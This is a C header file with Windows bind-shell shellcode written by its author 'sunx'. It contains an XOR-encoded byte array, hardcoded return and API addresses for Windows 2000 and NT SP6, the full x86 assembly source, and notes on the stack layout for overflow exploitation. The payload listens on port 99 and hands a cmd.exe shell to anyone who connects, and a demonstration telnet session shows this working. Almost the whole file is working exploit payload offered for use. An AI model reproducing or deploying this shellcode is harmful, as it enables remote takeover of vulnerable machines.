/********************************************************************************************************

          WinShellCode  Writen by sunx 
        sunx@cnns.net, http://www.cnns.net

 This shellcode works like most remote UNIX shell

 it will listen on port 99, 
 when telnet to chis port, a cmd.exe shell will active

 It is asm code is followed.

 For remove char(0) in data
 shellcode is xor 0x99, it will decode itself, when on run

 when overflow, run time cpu mirror is :

-------------------RRRR-NOPNOPNOPNOPNOPNOPNOP-ShellCodeShellCodeShellCode-------------------
                       ^                       ^
                       |                       |
                       |                       |
                     ESP point to here       shellcode place here
 
 ESP must less than shellcode start address, when run this shellcode

 [root@Linux /]# telnet 192.168.0.5 99
 Trying 192.168.0.5...
 Connected to sunx (192.168.0.5).
 Escape character is '^]'.
 Microsoft Windows 2000 [Version 5.00.2195]
 (C) ��Ȩ���� 1985-2000 Microsoft Corp.

 E:\work\asm\winshell\conv>cd \

 cd \

 E:\>^]q

 Connection closed.
 [root@Linux /]# telnet 192.168.0.5 99
 Trying 192.168.0.5...
 Connected to sunx (192.168.0.5).
 Escape character is '^]'.

 E:\>c:  

 c:

 C:\>

********************************************************************************************************/

#ifndef WINSHELLCODE_H
#define WINSHELLCODE_H

const unsigned long  OfsShellCodeLoadLib = 0x436;
const unsigned long  OfsShellCodeGetProc = 0x43a;
const unsigned long  OfsShellCodeShell = 0x442;

const unsigned long  JMPESP_Win2k2195  = 0x77e6898b;
const unsigned long  JMPESP_WinNTsp6   = 0x77f0eac3;

const unsigned long  LoadLib_Win2k2195 = 0x77e67273;
const unsigned long  GetProc_Win2k2195 = 0x77e67031;

const unsigned long  LoadLib_WinNTsp6 = 0x77ee391a;
const unsigned long  GetProc_WinNTsp6 = 0x77ee4111;

unsigned char shellcode[]=
{
	    0x8b, 0xfc, 0xb8, 0x73, 0x75, 0x6e, 0x78, 0x47, 0x39, 0x07, 0x75, 0xfb, 0x8d, 0x6f, 0xfd, 0x8d, 
		0x7d, 0x26, 0x90, 0x90, 0x90, 0x8b, 0xf7, 0xb4, 0x99, 0xfc, 0xac, 0x32, 0xc4, 0xaa, 0x81, 0x3e, 
		0x73, 0x75, 0x6e, 0x78, 0x75, 0xf4, 0x14, 0x24, 0xdb, 0x9d, 0x99, 0x99, 0x65, 0xaa, 0x50, 0x28, 
		0xb9, 0x29, 0xbd, 0x6b, 0x37, 0x5f, 0xde, 0x66, 0x99, 0x71, 0x4c, 0x9b, 0x99, 0x99, 0x71, 0x41, 
		0x98, 0x99, 0x99, 0x10, 0x1c, 0xb3, 0x9d, 0x99, 0x99, 0x71, 0x44, 0x98, 0x99, 0x99, 0x71, 0xcb, 
		0x9b, 0x99, 0x99, 0x10, 0x1c, 0xb7, 0x9d, 0x99, 0x99, 0x71, 0x9d, 0x98, 0x99, 0x99, 0x12, 0x1c, 
		0xb7, 0x9d, 0x99, 0x99, 0x71, 0x88, 0x9b, 0x99, 0x99, 0x10, 0x1c, 0xab, 0x9d, 0x99, 0x99, 0x71, 
		0x9b, 0x99, 0x99, 0x99, 0x72, 0x71, 0x12, 0x1c, 0x8f, 0x9d, 0x99, 0x99, 0x71, 0x28, 0x99, 0x99, 
		0x99, 0x1a, 0x61, 0x99, 0xed, 0xc0, 0x09, 0x09, 0x09, 0x09, 0xaa, 0x59, 0xc9, 0x14, 0x1c, 0xbf, 
		0x9d, 0x99, 0x99, 0xc9, 0xaa, 0x59, 0x2d, 0x9d, 0xc9, 0x12, 0x1c, 0xb3, 0x9d, 0x99, 0x99, 0xc9, 
		0x12, 0x1c, 0x8f, 0x9d, 0x99, 0x99, 0xc9, 0x66, 0x0c, 0x55, 0x9a, 0x99, 0x99, 0x1a, 0x61, 0x99, 
		0xed, 0xe4, 0x09, 0x09, 0x09, 0x09, 0xaa, 0x59, 0xc9, 0x12, 0x1c, 0xbf, 0x9d, 0x99, 0x99, 0xc9, 
		0x12, 0x1c, 0xb3, 0x9d, 0x99, 0x99, 0xc9, 0x12, 0x1c, 0xab, 0x9d, 0x99, 0x99, 0xc9, 0x66, 0x0c, 
		0x93, 0x9d, 0x99, 0x99, 0x1a, 0x61, 0x99, 0xe5, 0xcf, 0x09, 0x09, 0x09, 0x09, 0x72, 0x0e, 0xaa, 
		0x59, 0xc9, 0x2d, 0x9d, 0xc9, 0x12, 0x1c, 0xb3, 0x9d, 0x99, 0x99, 0xc9, 0x12, 0x1c, 0xab, 0x9d, 
		0x99, 0x99, 0xc9, 0x66, 0x0c, 0x96, 0x9d, 0x99, 0x99, 0x1a, 0x61, 0x99, 0xe5, 0xa8, 0x09, 0x09, 
		0x09, 0x09, 0xaa, 0x42, 0xca, 0x14, 0x04, 0xbf, 0x9d, 0x99, 0x99, 0xca, 0xc9, 0x12, 0x1c, 0xb3, 
		0x9d, 0x99, 0x99, 0xc9, 0x12, 0x1c, 0xbb, 0x9d, 0x99, 0x99, 0xc9, 0x66, 0x0c, 0x5b, 0x9a, 0x99, 
		0x99, 0x1a, 0x61, 0x99, 0xed, 0x90, 0x09, 0x09, 0x09, 0x09, 0x70, 0xde, 0x66, 0x66, 0x66, 0xaa, 
		0x59, 0x5a, 0xaa, 0x42, 0xca, 0x14, 0x04, 0xc7, 0x98, 0x99, 0x99, 0xca, 0xaa, 0x42, 0xca, 0xca, 
		0xca, 0xc9, 0x66, 0x0c, 0x31, 0x9a, 0x99, 0x99, 0x1a, 0x61, 0x99, 0xed, 0x92, 0x09, 0x09, 0x09, 
		0x09, 0x12, 0x1c, 0xc7, 0x98, 0x99, 0x99, 0x5a, 0x21, 0x99, 0x99, 0x99, 0x99, 0x5a, 0x99, 0x99, 
		0x99, 0x99, 0x14, 0x1c, 0x52, 0x98, 0x99, 0x99, 0x5e, 0x99, 0xdd, 0x99, 0x99, 0x99, 0xc9, 0x66, 
		0x0c, 0xe4, 0x9a, 0x99, 0x99, 0x12, 0x1c, 0x83, 0x9d, 0x99, 0x99, 0x10, 0x1c, 0x92, 0x9b, 0x99, 
		0x99, 0x10, 0x1c, 0x9e, 0x9b, 0x99, 0x99, 0x12, 0x1c, 0x87, 0x9d, 0x99, 0x99, 0x10, 0x1c, 0x9a, 
		0x9b, 0x99, 0x99, 0xaa, 0x59, 0xff, 0x21, 0x98, 0x98, 0x10, 0x1c, 0x6e, 0x98, 0x99, 0x99, 0x14, 
		0x1c, 0x52, 0x98, 0x99, 0x99, 0xc9, 0xc9, 0xaa, 0x59, 0xc9, 0xc9, 0xc9, 0xd9, 0xc9, 0xd1, 0xc9, 
		0xc9, 0x14, 0x1c, 0xdb, 0x9d, 0x99, 0x99, 0xc9, 0xaa, 0x59, 0xc9, 0x66, 0x0c, 0x14, 0x9a, 0x99, 
		0x99, 0x1a, 0x61, 0x99, 0x96, 0x1d, 0xdb, 0x98, 0x99, 0x99, 0x5a, 0x99, 0x99, 0x99, 0x99, 0x99, 
		0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 
		0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 
		0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 
		0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 
		0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0xaa, 0x59, 0x2d, 0x9d, 0xc9, 
		0x58, 0x71, 0x9d, 0xc9, 0x66, 0x0c, 0x2f, 0x9a, 0x99, 0x99, 0x5a, 0xaa, 0x59, 0xc9, 0x14, 0x1c, 
		0xf7, 0x9b, 0x99, 0x99, 0x5e, 0x99, 0x95, 0x99, 0x99, 0x99, 0xc9, 0x14, 0x1c, 0x83, 0x9d, 0x99, 
		0x99, 0xc9, 0x14, 0x1c, 0x8f, 0x9d, 0x99, 0x99, 0xc9, 0x66, 0x0c, 0xeb, 0x9a, 0x99, 0x99, 0xaa, 
		0x59, 0xc9, 0x14, 0x1c, 0xf7, 0x9b, 0x99, 0x99, 0xc9, 0x14, 0x1c, 0xbb, 0x9d, 0x99, 0x99, 0xc9, 
		0x14, 0x1c, 0x87, 0x9d, 0x99, 0x99, 0xc9, 0x66, 0x0c, 0xeb, 0x9a, 0x99, 0x99, 0x5a, 0x99, 0x99, 
		0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x98, 0x99, 0x99, 0x99, 0xc9, 0x14, 0x04, 0x38, 0x9b, 0x99, 
		0x99, 0x5e, 0x9a, 0x89, 0x99, 0x99, 0x99, 0xca, 0x14, 0x04, 0x65, 0x9b, 0x99, 0x99, 0xca, 0xc9, 
		0x66, 0x0c, 0x9a, 0x9d, 0x99, 0x99, 0x12, 0x41, 0x1a, 0x61, 0x99, 0xc1, 0xe5, 0x45, 0x12, 0x5a, 
		0x5a, 0x89, 0x99, 0x99, 0x99, 0xaa, 0x59, 0xc9, 0xd9, 0xc9, 0xd9, 0xc9, 0x66, 0x0c, 0x69, 0x9a, 
		0x99, 0x99, 0x1a, 0x61, 0x66, 0xed, 0xdb, 0x09, 0x09, 0x09, 0x09, 0x10, 0x1c, 0xb7, 0x9d, 0x99, 
		0x99, 0xf3, 0x89, 0x14, 0x04, 0x65, 0x9b, 0x99, 0x99, 0xca, 0xc9, 0x66, 0x0c, 0x6e, 0x9a, 0x99, 
		0x99, 0x1a, 0x61, 0x99, 0xec, 0xba, 0x09, 0x09, 0x09, 0x09, 0xf3, 0x9c, 0x12, 0x1c, 0xb7, 0x9d, 
		0x99, 0x99, 0xc9, 0x66, 0x0c, 0x65, 0x9a, 0x99, 0x99, 0x1a, 0x61, 0x99, 0xec, 0x92, 0x09, 0x09, 
		0x09, 0x09, 0x12, 0x1c, 0xb7, 0x9d, 0x99, 0x99, 0x5a, 0xaa, 0x59, 0x5a, 0x9b, 0x99, 0x99, 0xfa, 
		0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x66, 0x0c, 0x42, 0x9a, 
		0x99, 0x99, 0x5a, 0x14, 0x24, 0xf0, 0x9a, 0x99, 0x99, 0x12, 0x5e, 0xce, 0x71, 0xb6, 0x99, 0x99, 
		0x99, 0xc6, 0xc9, 0xab, 0x59, 0xaa, 0x50, 0x6e, 0x48, 0x65, 0x6b, 0x37, 0xc1, 0x19, 0xa6, 0x99, 
		0xed, 0x8e, 0x09, 0x09, 0x09, 0x09, 0xc9, 0xce, 0x12, 0x46, 0x71, 0x84, 0x99, 0x99, 0x99, 0xc6, 
		0x10, 0x9e, 0xc1, 0xde, 0xde, 0xde, 0xde, 0x72, 0x40, 0xde, 0x19, 0xa6, 0x99, 0xec, 0x53, 0x5a, 
		0xca, 0x14, 0x04, 0xaf, 0x9d, 0x99, 0x99, 0xc9, 0x66, 0x8a, 0xc2, 0x5a, 0xce, 0x14, 0x24, 0xa3, 
		0x9d, 0x99, 0x99, 0xca, 0xc9, 0x66, 0x8e, 0xc6, 0x5a, 0xd2, 0xdc, 0xcb, 0xd7, 0xdc, 0xd5, 0xaa, 
		0xab, 0x99, 0xda, 0xeb, 0xfc, 0xf8, 0xed, 0xfc, 0xc9, 0xf0, 0xe9, 0xfc, 0x99, 0xde, 0xfc, 0xed, 
		0xca, 0xed, 0xf8, 0xeb, 0xed, 0xec, 0xe9, 0xd0, 0xf7, 0xff, 0xf6, 0xd8, 0x99, 0xda, 0xeb, 0xfc, 
		0xf8, 0xed, 0xfc, 0xc9, 0xeb, 0xf6, 0xfa, 0xfc, 0xea, 0xea, 0xd8, 0x99, 0xda, 0xf5, 0xf6, 0xea, 
		0xfc, 0xd1, 0xf8, 0xf7, 0xfd, 0xf5, 0xfc, 0x99, 0xc9, 0xfc, 0xfc, 0xf2, 0xd7, 0xf8, 0xf4, 0xfc, 
		0xfd, 0xc9, 0xf0, 0xe9, 0xfc, 0x99, 0xde, 0xf5, 0xf6, 0xfb, 0xf8, 0xf5, 0xd8, 0xf5, 0xf5, 0xf6, 
		0xfa, 0x99, 0xce, 0xeb, 0xf0, 0xed, 0xfc, 0xdf, 0xf0, 0xf5, 0xfc, 0x99, 0xcb, 0xfc, 0xf8, 0xfd, 
		0xdf, 0xf0, 0xf5, 0xfc, 0x99, 0xca, 0xf5, 0xfc, 0xfc, 0xe9, 0x99, 0xdc, 0xe1, 0xf0, 0xed, 0xc9, 
		0xeb, 0xf6, 0xfa, 0xfc, 0xea, 0xea, 0x99, 0x99, 0xce, 0xca, 0xd6, 0xda, 0xd2, 0xaa, 0xab, 0x99, 
		0xea, 0xf6, 0xfa, 0xf2, 0xfc, 0xed, 0x99, 0xfb, 0xf0, 0xf7, 0xfd, 0x99, 0xf5, 0xf0, 0xea, 0xed, 
		0xfc, 0xf7, 0x99, 0xf8, 0xfa, 0xfa, 0xfc, 0xe9, 0xed, 0x99, 0xea, 0xfc, 0xf7, 0xfd, 0x99, 0xeb, 
		0xfc, 0xfa, 0xef, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 
		0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 
		0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 
		0xea, 0xeb, 0x7f, 0xee,                         //address of loadlibrarya, it is os version depended
		0xa8, 0xe9, 0x7f, 0xee,                         //address of getprocaddress, it is os version depended
		0x73, 0x75, 0x6e, 0x78,                         //sunx, it is a decode flag, don't modify it
		0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x24, //cmd.exe$, you can modify it freely, 
		0x00
};

/********************************************************************************************************

;***************************************************************************************************
; Written by sunx
;***************************************************************************************************

.486

.model flat

locals

.code

shellcodebegin:

            mov edi, esp
            mov eax, 'xnus'
findnext:   inc edi
            cmp [edi], eax
            jnz findnext 

            lea ebp, [edi + offset shellcodebegin - offset findnext + 4 ]

            lea edi, [ebp + offset main - offset shellcodebegin]
            mov esi, edi
            mov ah, 99h
            cld

xorloop:    
            lodsb
            xor al, ah
            stosb
            cmp dword ptr [esi], 'xnus'
            jnz xorloop

main:       lea edi, [ebp + offset cmd - offset shellcodebegin]
            cld
            xor ecx, ecx
            mov cl, 32
            mov al, '$'
            repnz scasb
            mov byte ptr [edi-1], 0

            call processapi
            call initpbuf
            mov [ebp + offset pbuf - offset shellcodebegin], eax 
            call initpipe        
            call initsock   
            mov [ebp + offset accepthand - offset shellcodebegin], eax 
            call initshell

runloop:           
            mov eax, [ebp + offset accepthand - offset shellcodebegin]
            call getaconnect

            mov [ebp + offset sockhand - offset shellcodebegin], eax

            call runshell

            jmp runloop

;*******************************************************************************************************;*******************************************************************************************************;*******************************************************************************************************            

runshell    proc

@@peek:     mov eax, [ebp + offset pipeAread - offset shellcodebegin]
            call peekdata
            cmp eax, 0
            jz @@readinput

            ;readfile()
            xor eax, eax
            push eax

            lea  eax, [ebp + offset i - offset shellcodebegin]
            push eax

            xor eax, eax
            mov ah, 4
            push eax

            mov eax, [ebp + offset pbuf - offset shellcodebegin]
            push eax

            mov eax, [ebp + offset pipeAread - offset shellcodebegin]
            push eax
            call [ebp + offset readfile - offset shellcodebegin]

            cmp eax, 0 
            jz @@exit

            ;send() 
            xor eax, eax
            push eax
            mov eax, [ebp + offset i - offset shellcodebegin]
            push eax
            mov eax, [ebp + offset pbuf - offset shellcodebegin]
            push eax
            mov eax, [ebp + offset sockhand - offset shellcodebegin]
            push eax

            call [ebp + offset send - offset shellcodebegin]
            ;call [ebp + offset wsagetlasterror - offset shellcodebegin]

            cmp eax, 0
            jl @@exit

            jmp @@peek

@@readinput:
            xor eax, eax
            push eax
            mov ah, 4
            push eax
            mov eax, [ebp + offset pbuf - offset shellcodebegin]
            push eax
            mov eax, [ebp + offset sockhand - offset shellcodebegin]
            push eax
            call [ebp + offset recv - offset shellcodebegin]
            cmp eax, 0 
            jl @@exit

            xor ebx, ebx
            push ebx

            lea ebx, [ebp + offset i - offset shellcodebegin]
            push ebx

            push eax

            mov eax, [ebp + offset pbuf - offset shellcodebegin]
            push eax
            mov eax, [ebp + offset pipeBwrite - offset shellcodebegin]
            push eax
            call [ebp + offset writefile - offset shellcodebegin]

            cmp eax, 0
            jz @@exit

            jmp @@peek
            
@@exit:     xor eax, eax

            ret

runshell    endp

;*******************************************************************************************************
peekdata    proc     ;call with eax = pipehand,  return eax = bytes should be read

            xor ebx, ebx
            push ebx
            lea ebx, [ebp + offset peeki - offset shellcodebegin]
            push ebx

            xor ebx, ebx
            push ebx
            push ebx
            push ebx

            push eax

            call [ebp + offset peeknamedpipe - offset shellcodebegin]
            cmp eax, 0
            jz @@error

            mov eax, [ebp + offset peeki - offset shellcodebegin]            

            ret

@@error:    mov eax, 0
            ret

peeki       dd      0
peekdata    endp

;*******************************************************************************************************
initshell  proc
            lea eax, [ebp + offset StartupInfo - offset shellcodebegin]
            mov dword ptr [eax], 044h
            push eax
            call [ebp + offset getstartupinfo - offset shellcodebegin]    

            ;build startinfo
            mov eax, [ebp + offset pipeAwrite - offset shellcodebegin]    
            mov [ebp + offset StartupInfo - offset shellcodebegin + 40h], eax    
            mov [ebp + offset StartupInfo - offset shellcodebegin + 3ch], eax    
            mov eax, [ebp + offset pipeBread - offset shellcodebegin]
            mov [ebp + offset StartupInfo - offset shellcodebegin + 38h], eax        

            xor eax, eax
            mov ax, 0101h
            mov [ebp + offset StartupInfo - offset shellcodebegin +2Ch], eax

            lea eax, [ebp + offset StartupInfo - offset shellcodebegin]
            push eax
            push eax

            xor eax, eax
            push eax
            push eax
            push eax
            inc eax
            push eax
            dec eax
            push eax
            push eax

            lea eax, [ebp + offset cmd - offset shellcodebegin]
            push eax
            xor eax, eax
            push eax
            call [ebp + offset createprocess - offset shellcodebegin]

            cmp eax, 0
            jz exitshell

            ret

StartupInfo      db      50h dup(0) 
initshell  endp

;*******************************************************************************************************

initpbuf    proc    ;return eax = buf
            xor eax, eax
            mov ah, 4
            push eax
            shr eax, 4
            push eax 
            call [ebp + offset globalalloc - offset shellcodebegin]
            ret
initpbuf    endp

;*******************************************************************************************************

initpipe    proc
            xor eax, eax     
            push eax
            lea eax, [ebp + offset pipeattr - offset shellcodebegin]
            mov dword ptr [eax], 0ch
            push eax
            lea eax, [ebp + offset pipeAwrite - offset shellcodebegin]
            push eax
            lea eax, [ebp + offset pipeAread - offset shellcodebegin]
            push eax
            call [ebp + offset createpipe - offset shellcodebegin]    
            
            xor eax, eax
            push eax
            lea eax, [ebp + offset pipeattr - offset shellcodebegin]
            push eax
            lea eax, [ebp +  offset pipeBwrite - offset shellcodebegin]
            push eax
            lea eax, [ebp + offset pipeBread - offset shellcodebegin]
            push eax
            call [ebp + offset createpipe - offset shellcodebegin]    
            
            ret
                            
pipeattr  label
    len         dd      0
    lpSecDesc   dd      0    
    bInherit    dd      1 

initpipe    endp

;*******************************************************************************************************
            
getaconnect proc    ;return eax = sock, call with eax = sock
            
@@next:     push eax
            lea ebx, [ebp + offset @@accepti - offset shellcodebegin]
            mov dword ptr [ebx], 16

            push ebx
            lea ebx, [ebp + offset sockstruc - offset shellcodebegin]
            push ebx
            push eax
                       
            call [ebp + offset accept - offset shellcodebegin]
            mov ebx, eax
            cmp eax, 0
            pop eax
            jl @@next
            mov eax, ebx            
            ret
@@accepti   dd 16            
getaconnect endp            

;*******************************************************************************************************            
initsock    proc        ; return eax = sock


            ;socket()
            xor eax, eax
            push eax
            inc eax
            push eax
            inc eax
            push eax
            call [ebp + offset socket - offset shellcodebegin]
            cmp eax , 0ffffffffh
            jz @@exit

            mov [ebp + offset accepthand - offset shellcodebegin], eax            
                       
            ;bind()

            push 10h
            lea ebx, [ebp + offset sockstruc - offset shellcodebegin]
            push ebx
            push eax
            call [ebp + offset bind - offset shellcodebegin]
            cmp eax , 0
            jnz @@exit
            
            ;listen()
            push 5
            mov eax, [ebp + offset accepthand - offset shellcodebegin]
            push eax

            call [ebp + offset listen - offset shellcodebegin]
            cmp eax , 0
            jnz @@exit

            mov eax, [ebp + offset accepthand - offset shellcodebegin]
            ret
            
@@exit:     xor eax, eax
            ret
            
sockstruc   label
    sin_family  dw      0002h
    sin_port    dw      6300h
    sin_addr    dd      0
    sin_zero    db      8 dup (0)

initsock    endp            

;*******************************************************************************************************
exitshell   proc
            call [ebp + offset exitprocess - offset shellcodebegin]            
            ret
exitshell   endp

;*******************************************************************************************************
processapi  proc
            ;kenel api
            lea edi, [ebp + offset library  - offset shellcodebegin]
            
@@loadlib:  
            mov eax, edi
            push edi
            call loadlib
            pop edi
            
@@nextknlapi:
            push eax
            xor al, al
            xor ecx, ecx
            not ecx
            cld
            repnz scasb
            pop eax            

            cmp byte ptr [edi], 0
            
            jz @@nextlib
            
            
            push eax
            push edi

            mov ebx, edi
            call getproc
            
            pop edi
            
            mov [edi], eax
            
            pop eax
            
            inc edi
            inc edi
            inc edi
            inc edi
                                  
            jmp @@nextknlapi
            
@@nextlib:  inc edi
            cmp byte ptr [edi], 0
            jnz @@loadlib

@@ret:            
            ret      
processapi  endp        

;*******************************************************************************************************

loadlib     proc    ;eax=libraryname
            push ebx
            lea ebx, [ebp + offset LoadLibrary  - offset shellcodebegin]

            push eax
            call dword ptr [ebx]
            pop ebx
            ret
loadlib     endp            

;*******************************************************************************************************
        
getproc     proc    ;eax=handle, ebx = procname
            push edi
            lea edi, [ebp + offset GetProcAddr  - offset shellcodebegin]
            push ebx
            push eax
            call dword ptr [edi]
            pop edi
            ret
getproc     endp

;******************************************************************************************************* 

databegin   label

library     label

kernel          db      "KERNEL32", 0 
createpipe      db      "CreatePipe", 0 
getstartupinfo  db      "GetStartupInfoA", 0 
createprocess   db      "CreateProcessA", 0 
closehandle     db      "CloseHandle", 0 
peeknamedpipe   db      "PeekNamedPipe", 0 
globalalloc     db      "GlobalAlloc", 0 
writefile       db      "WriteFile", 0 
readfile        db      "ReadFile", 0 
sleep           db      "Sleep", 0 
exitprocess     db      "ExitProcess", 0 

                db       0
       
wsock32         db      "WSOCK32", 0 
socket          db      "socket", 0 
bind            db      "bind", 0 
listen          db      "listen", 0 
accept          db      "accept", 0 
send            db      "send", 0 
recv            db      "recv", 0 
;wsagetlasterror db      "WSAGetLastError", 0

                db       0
                db       0

pipeAread        dd      0
pipeAwrite       dd      0
pipeBread        dd      0
pipeBwrite       dd      0
        
i                dd      0
pbuf             dd      0
accepthand       dd      0
sockhand         dd      0

LoadLibrary dd 77e67273h
GetProcAddr dd 77e67031h
        
                dd 'xnus'
                
cmd             db  "cmd.exe$"                      
        
                db  0dh, 0ah  

dataend        label

.data
                ends
                end shellcodebegin 

*********************************************************************************************************/

#endif //WINSHELLCODE_H